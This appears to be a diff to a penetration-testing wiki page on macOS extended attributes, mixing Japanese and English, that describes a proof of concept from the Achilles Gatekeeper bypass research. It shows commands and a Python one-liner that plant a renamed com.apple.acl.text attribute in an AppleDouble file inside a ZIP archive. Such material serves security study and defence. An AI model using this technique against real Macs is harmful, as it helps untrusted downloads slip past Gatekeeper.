@@ -1,6 +1,8 @@
-# macOS xattr-acls 追加情報
+# macOS xattr-acls extra stuff
 
 {{#include ../../../../banners/hacktricks-training.md}}
+
+以下のproof of conceptは、Achilles Gatekeeper bypass researchで使用されたAppleDouble/ACL techniqueを再現します。ACLをextended attributeとしてシリアライズし、AppleDouble file内に保持し、attributeの名前を`com.apple.acl.text`に変更して、`ditto`でZIP archiveを再構築します。<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 rm -rf /tmp/test*
 echo test >/tmp/test
@@ -57,7 +59,7 @@ return 0;
 ```
 </details>
 ```bash
-# Lets add the xattr com.apple.xxx.xxxx with the acls
+# Add the com.apple.xxx.xxxx extended attribute containing the ACL
 mkdir start
 mkdir start/protected
 ./set_xattr start/protected
@@ -150,12 +152,12 @@ return 0;
 ```
 </details>
 ```bash
-# Create appledoublefile with the xattr entitlement
+# Create an AppleDouble file containing the extended attribute
 ditto -c -k start protected.zip
 rm -rf start
 # extract the files
 unzip protected.zip
-# Replace the name of the xattr here (if you put it before ditto would have destroyed it)
+# Replace the extended-attribute name here (ditto would otherwise remove com.apple.acl.text)
 python3 -c "with open('._protected', 'rb+') as f: content = f.read().replace(b'com.apple.xxx.xxxx', b'com.apple.acl.text'); f.seek(0); f.write(content); f.truncate()"
 # zip everything back together
 rm -rf protected.zip
@@ -169,4 +171,8 @@ rm ._*
 ditto -x -k --rsrc protected.zip .
 xattr -l protected
 ```
+## References
+
+- [1] [Microsoft Security Blog — Gatekeeperのアキレス腱：macOSの脆弱性を発掘](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
+- [2] [Apple Developer — `ditto`を使用した配布用Macソフトウェアのパッケージ化](https://developer.apple.com/documentation/xcode/packaging-mac-software-for-distribution)
 {{#include ../../../../banners/hacktricks-training.md}}
